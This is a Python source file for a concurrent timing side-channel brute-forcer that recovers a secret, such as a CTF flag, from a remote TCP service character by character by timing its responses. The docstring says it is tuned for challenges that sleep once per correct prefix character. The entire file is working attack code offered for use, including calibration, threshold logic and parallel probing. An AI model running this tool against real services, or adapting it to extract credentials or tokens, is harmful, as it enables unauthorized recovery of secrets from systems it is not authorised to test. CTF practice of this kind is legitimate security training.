#!/usr/bin/env python3
"""Timing side-channel attack against remote TCP services.

Brute-forces a secret character-by-character by measuring response time.
Optimized for CTF challenges where the server calls sleep(N) for N correct
prefix characters.

Key optimizations:
  1. Absolute threshold:  We know wrong probes take ~N*1s and correct take
     ~(N+1)*1s.  Use an absolute cutoff instead of comparing deltas -- no
     expensive re-verification needed.
  2. Concurrent probing:  Test multiple chars in parallel (default 5).
     Each position completes in ceil(charset/concurrency) * probe_time
     instead of charset * probe_time.
  3. Early accept:  As soon as a char exceeds the threshold, accept it
     immediately without waiting for remaining probes.

Usage:
    python3 auto_timing_attack.py --host 172.16.16.7 --port 26682 \\
        --prefix "vere{" --suffix "}" --charset alphanum_under \\
        --body-length 20 --concurrency 5
"""
from __future__ import annotations

import argparse
import asyncio
import functools
import string
import sys
import time

# Force unbuffered output
print = functools.partial(print, flush=True)

# ---------------------------------------------------------------------------
# Charset helpers
# ---------------------------------------------------------------------------

_CHARSETS: dict[str, str] = {
    "lowercase": string.ascii_lowercase,
    "uppercase": string.ascii_uppercase,
    "alpha": string.ascii_letters,
    "alphanum": string.ascii_letters + string.digits,
    "alphanum_under": string.ascii_lowercase + string.digits + "_",
    "hex": string.hexdigits[:16],
    "printable": string.printable.strip(),
}


def _resolve_charset(name: str) -> str:
    return _CHARSETS.get(name, name)


# ---------------------------------------------------------------------------
# Core probe
# ---------------------------------------------------------------------------

_NO_BANNER = False
_NO_NEWLINE = False


async def _probe(host: str, port: int, payload: str, timeout: float) -> float:
    """Send payload, return elapsed seconds. Returns timeout on error."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
    except (asyncio.TimeoutError, OSError):
        return timeout

    start = time.monotonic()
    try:
        if not _NO_BANNER:
            try:
                await asyncio.wait_for(reader.read(4096), timeout=0.3)
            except asyncio.TimeoutError:
                pass

        raw = payload.encode() if _NO_NEWLINE else (payload + "\n").encode()
        writer.write(raw)
        await writer.drain()

        try:
            await asyncio.wait_for(reader.read(4096), timeout=timeout)
        except asyncio.TimeoutError:
            pass
    finally:
        elapsed = time.monotonic() - start
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
    return elapsed


# ---------------------------------------------------------------------------
# Main attack loop
# ---------------------------------------------------------------------------

async def attack(
    host: str,
    port: int,
    prefix: str,
    suffix: str,
    charset: str,
    body_length: int,
    timeout_per_char: float,
    concurrency: int,
    flag_format: str,
) -> str | None:
    """Run the timing side-channel attack. Returns the flag or None."""

    chars = _resolve_charset(charset)
    total_len = len(prefix) + body_length + len(suffix)
    known = prefix
    t_start = time.monotonic()

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Prefix={prefix!r}  Suffix={suffix!r}  "
          f"Charset={charset} ({len(chars)} chars)")
    print(f"[*] Body length={body_length}  Concurrency={concurrency}")
    print(f"[*] Total flag length={total_len}")

    # Calibrate: measure a known-wrong probe to find sleep-per-char
    cal_payload = prefix + chars[0] * body_length + suffix
    cal_timeout = len(prefix) + 5.0
    cal_time = await _probe(host, port, cal_payload, cal_timeout)
    sleep_per_char = cal_time / len(prefix) if len(prefix) > 0 else 1.0
    print(f"[*] Calibration: {cal_time:.3f}s for {len(prefix)} correct "
          f"=> ~{sleep_per_char:.2f}s/char")

    for pos in range(body_length):
        num_correct = len(known)
        expected_wrong = num_correct * sleep_per_char
        threshold = expected_wrong + sleep_per_char * 0.5  # halfway to next
        probe_timeout = expected_wrong + sleep_per_char * 2.0  # generous

        sem = asyncio.Semaphore(concurrency)
        found_char = None
        found_event = asyncio.Event()
        results: list[tuple[str, float]] = []

        async def _try_char(ch: str) -> None:
            nonlocal found_char
            if found_event.is_set():
                return  # another char already won
            remaining = total_len - len(known) - 1 - len(suffix)
            payload = known + ch + ("A" * max(remaining, 0)) + suffix
            async with sem:
                if found_event.is_set():
                    return
                t = await _probe(host, port, payload, probe_timeout)
            results.append((ch, t))
            if t > threshold and not found_event.is_set():
                found_char = ch
                found_event.set()

        tasks = [asyncio.create_task(_try_char(ch)) for ch in chars]

        # Wait for either: a char found, or all tasks done
        done_waiter = asyncio.ensure_future(asyncio.gather(*tasks))
        found_waiter = asyncio.ensure_future(found_event.wait())
        await asyncio.wait(
            [done_waiter, found_waiter],
            return_when=asyncio.FIRST_COMPLETED,
        )

        # If found early, cancel remaining tasks
        if found_char:
            for t in tasks:
                t.cancel()
            # Suppress cancellation errors
            await asyncio.gather(*tasks, return_exceptions=True)
        else:
            # All done, no clear winner -- pick slowest
            await done_waiter
            if results:
                results.sort(key=lambda x: x[1], reverse=True)
                found_char = results[0][0]

        if not found_char:
            print(f"[!] Position {pos}: no candidate found")
            break

        known += found_char
        wall = time.monotonic() - t_start

        # Find the timing for the winning char
        winner_time = next((t for ch, t in results if ch == found_char), 0)
        tested = len(results)

        print(f"[+] Pos {pos}: '{found_char}' "
              f"({winner_time:.2f}s > threshold {threshold:.2f}s, "
              f"tested {tested}/{len(chars)})  "
              f"=> {known}  [{wall:.0f}s]")

    flag = known + suffix
    total_elapsed = time.monotonic() - t_start
    print(f"\nEXTRACTED FLAG: {flag}")
    print(f"Total time: {total_elapsed:.0f}s")
    return flag


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    global _NO_BANNER, _NO_NEWLINE

    ap = argparse.ArgumentParser(
        description="Timing side-channel attack against TCP services"
    )
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", required=True, type=int)
    ap.add_argument("--prefix", default="flag{")
    ap.add_argument("--suffix", default="}")
    ap.add_argument("--charset", default="alphanum_under")
    ap.add_argument("--body-length", type=int, default=14)
    ap.add_argument("--timeout-per-char", type=float, default=5.0)
    ap.add_argument("--concurrency", type=int, default=5)
    ap.add_argument("--flag-format", default=r"flag\{[a-zA-Z0-9_]+\}")
    ap.add_argument("--no-banner", action="store_true")
    ap.add_argument("--no-newline", action="store_true")
    args = ap.parse_args()

    _NO_BANNER = args.no_banner
    _NO_NEWLINE = args.no_newline

    result = asyncio.run(attack(
        host=args.host, port=args.port,
        prefix=args.prefix, suffix=args.suffix,
        charset=args.charset, body_length=args.body_length,
        timeout_per_char=args.timeout_per_char,
        concurrency=args.concurrency,
        flag_format=args.flag_format,
    ))
    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
